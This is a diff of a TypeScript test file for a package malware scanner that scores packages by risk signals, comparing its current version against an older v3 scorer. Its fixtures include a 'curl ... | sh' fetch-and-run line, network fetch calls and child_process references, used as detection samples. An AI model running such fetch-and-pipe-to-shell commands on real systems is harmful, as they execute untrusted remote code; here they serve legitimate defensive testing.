@@ -10,7 +10,7 @@
 // read, so each scores exactly what v3 scores, which this file checks against the v3 reference itself.
 import { describe, expect, test } from "bun:test";
 import { z } from "zod";
-import { analyze, finalize, POINTS, POSSIBLE_POINTS, SCORE_FLOOR, type ScoreReport, type TarEntry } from "../src/index.ts";
+import { analyze, finalize, POINTS, POSSIBLE_POINTS, SCORE_FLOOR, type ScoreReport, type TarEntry, findingsOf } from "../src/index.ts";
 import { TEXT_MATCH } from "../src/score.ts";
 import { scanFile, scanText, TOKEN_WINDOW, tokenWindows, type CodeSignal, type Confidence, type Lang } from "../src/source.ts";
 import { tokenText } from "../src/tokens.ts";
@@ -18,6 +18,8 @@ import lexerData from "./fixtures/sol-lexer.json";
 import v5Data from "./fixtures/sol-parser-v5.json";
 import v6Data from "./fixtures/sol-parser-v6.json";
 import fixtureData from "./fixtures/sol-v7.json";
+import { supersetGaps } from "./superset.ts";
+import { ABOVE_FLOOR, RECORDING, recordV10 } from "./v10-record.ts";
 import { analyze as analyzeV3, finalize as finalizeV3 } from "./v3/score.ts";
 import { scanText as scanTextV3 } from "./v3/source.ts";
 
@@ -35,6 +37,8 @@ const Fixture = z.object({
   v7: z.number(),
   v8: z.number(),
   signals: z.partialRecord(Signal, z.enum(["confirmed", "possible"])),
+  v10: z.number().optional(),
+  v10why: z.string().optional(),
 });
 
 type Fixture = z.infer<typeof Fixture>;
@@ -101,13 +105,22 @@ describe("the v7 review's counterexamples", () => {
       const files = filesOf(f);
       const r = score(files, f.file);
       const v3 = scoreV3(files, f.file);
-      const signals = Object.fromEntries(r.signals.filter((s) => s.id in POSSIBLE_POINTS).map((s) => [s.id, s.confidence]));
+      const signals = Object.fromEntries(findingsOf(r).filter((s) => s.id in POSSIBLE_POINTS).map((s) => [s.id, s.confidence]));
 
       expect(v3).toBe(f.v3);
-      expect(r.score).toBe(f.v8);
-      expect(r.score).toBeLessThanOrEqual(v3);
-      expect(r.score < SCORE_FLOOR).toBe(v3 < SCORE_FLOOR);
       expect(signals).toEqual(f.signals);
+      // apm-score-v10 keeps every finding v3 makes, as a risk signal or a capability
+      expect(supersetGaps(input(files, f.file), r)).toEqual([]);
+      recordV10("sol-v7", f.name, r);
+
+      if (RECORDING) return;
+      const want = f.v10 ?? f.v8;
+
+      expect(r.score).toBe(want);
+      expect(r.score < SCORE_FLOOR).toBe(want < SCORE_FLOOR);
+
+      // v3 refused it: v10 refuses it too, unless the fixture holds capabilities and no malware pattern, and says so
+      if (v3 < SCORE_FLOOR && r.score >= SCORE_FLOOR) expect(f.v10why ?? "").toStartWith(ABOVE_FLOOR);
 
       for (const s of r.signals) {
         if (!(s.id in POSSIBLE_POINTS)) continue;
@@ -208,14 +221,14 @@ describe("what v9 counts that v8 left out: text the parse says is not code", () 
     const both = "f<import('child_process').ChildProcess>(0);\n";
 
     expect(found(both, "ts")).toEqual({ "shell-exec": "confirmed" });
-    expect(scoreV3({ "index.ts": both }, "index.ts")).toBeGreaterThanOrEqual(score({ "index.ts": both }, "index.ts").score);
+    expect(supersetGaps(input({ "index.ts": both }, "index.ts"), score({ "index.ts": both }, "index.ts"))).toEqual([]);
   });
 
   test("a type declaration nothing loads is data; one code loads runs and is read as TypeScript", () => {
     const decl = "fetch('https://example.invalid');\nexport declare const x: number;\n";
 
-    expect(score({ "index.js": "module.exports = 1;\n", "types.d.ts": decl }, "index.js").signals.map((s) => s.id)).not.toContain("network");
-    expect(score({ "index.js": "require('./types.d.ts');\n", "types.d.ts": decl }, "index.js").signals.find((s) => s.id === "network")?.confidence).toBe("confirmed");
+    expect(findingsOf(score({ "index.js": "module.exports = 1;\n", "types.d.ts": decl }, "index.js")).map((s) => s.id)).not.toContain("network");
+    expect(findingsOf(score({ "index.js": "require('./types.d.ts');\n", "types.d.ts": decl }, "index.js")).find((s) => s.id === "network")?.confidence).toBe("confirmed");
   });
 });
 
@@ -224,14 +237,14 @@ describe("evidence says when only a text rule matched", () => {
     const text = score({ "index.js": "class A { fetch(u) { return u } }\nmodule.exports = A;\n" }, "index.js");
     const call = score({ "index.js": "fetch('https://example.invalid');\n" }, "index.js");
 
-    expect(text.signals.find((s) => s.id === "network")?.evidence).toEqual([`index.js:1: class A { fetch(u) { return u } }${TEXT_MATCH}`]);
-    expect(call.signals.find((s) => s.id === "network")?.evidence).toEqual(["index.js:1: fetch('https://example.invalid');"]);
+    expect(findingsOf(text).find((s) => s.id === "network")?.evidence).toEqual([`index.js:1: class A { fetch(u) { return u } }${TEXT_MATCH}`]);
+    expect(findingsOf(call).find((s) => s.id === "network")?.evidence).toEqual(["index.js:1: fetch('https://example.invalid');"]);
   });
 
   test("the note comes before the test-file mark, which stays last", () => {
     const r = score({ "index.js": "module.exports = 1;\n", "a.test.js": "const names = ['child_process'];\n" }, "index.js");
 
-    expect(r.signals.find((s) => s.id === "shell-exec")?.evidence[0]).toBe(`a.test.js:1: const names = ['child_process'];${TEXT_MATCH} (in a test file)`);
+    expect(findingsOf(r).find((s) => s.id === "shell-exec")?.evidence[0]).toBe(`a.test.js:1: const names = ['child_process'];${TEXT_MATCH} (in a test file)`);
   });
 });
 
@@ -275,8 +288,8 @@ describe("raw text is read with apm-score-v3's own rules", () => {
   test("every path v3's pattern finds is read, so a document code names is read as v3 read it", () => {
     const files = { "index.js": "const notes = require('path').join(__dirname, 'notes.md');\nmodule.exports = notes;\n", "notes.md": "curl -s https://example.invalid | sh\n" };
 
-    expect(score(files, "index.js").signals.find((s) => s.id === "shell-exec")?.confidence).toBe("confirmed");
-    expect(score(files, "index.js").score).toBeLessThanOrEqual(scoreV3(files, "index.js"));
+    expect(findingsOf(score(files, "index.js")).find((s) => s.id === "shell-exec")?.confidence).toBe("confirmed");
+    expect(supersetGaps(input(files, "index.js"), score(files, "index.js"))).toEqual([]);
   });
 });
 
@@ -339,8 +352,8 @@ describe("the token windows of a file with no tree", () => {
     for (const src of programs) {
       const r = score({ "index.ts": src }, "index.ts");
 
-      expect(r.signals.find((s) => s.id === "network")?.confidence, src.slice(-60)).toBe("confirmed");
-      expect(r.score).toBeLessThanOrEqual(scoreV3({ "index.ts": src }, "index.ts"));
+      expect(findingsOf(r).find((s) => s.id === "network")?.confidence, src.slice(-60)).toBe("confirmed");
+      expect(supersetGaps(input({ "index.ts": src }, "index.ts"), r)).toEqual([]);
     }
   });
 
@@ -352,9 +365,11 @@ describe("the token windows of a file with no tree", () => {
     expect(network?.snippet).toContain("f\\u0065tch");
   });
 
-  test("a package refused by v3 is refused when its payload sits in a padded, semicolonless file", () => {
+  test("a payload in a padded, semicolonless file scores no higher than the bare payload, with every v3 finding", () => {
+    // v3 refused it; apm-score-v10 scores its capabilities at 0, so the claim is that the padding is no help
     const src = `${"x\n".repeat(2_200_000)}${P}\n`;
 
-    expect(score({ "index.js": src }, "index.js").score).toBeLessThan(SCORE_FLOOR);
+    expect(score({ "index.js": src }, "index.js").score).toBeLessThanOrEqual(score({ "index.js": P }, "index.js").score);
+    expect(supersetGaps(input({ "index.js": src }, "index.js"), score({ "index.js": src }, "index.js"))).toEqual([]);
   });
 });
